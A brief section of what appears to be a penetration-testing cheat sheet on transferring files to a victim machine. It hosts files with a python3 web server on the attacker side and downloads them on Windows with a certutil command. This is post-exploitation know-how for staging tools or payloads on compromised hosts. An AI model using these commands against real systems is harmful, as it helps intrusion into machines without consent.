#  Transferring Files

In many engagements you will need to be able to copy files between the victim machine and attacking machine.  This section outlines a number of common methods for transferring files for both Windows and Linux.  Note that this will usually rely on having the necessary files hosted on a webserver. This can be achieved by using python3 to create a temporary web server to host files on the attacker machine:
`python3 -m http.server 80`

## Windows 

### CertUtil.exe

CertUtil can be used to download files from a web server using the following command:

`certutil -urlcache -split -f "http://ip-addr:port/NameOfHostedFile" <output-file-name>`
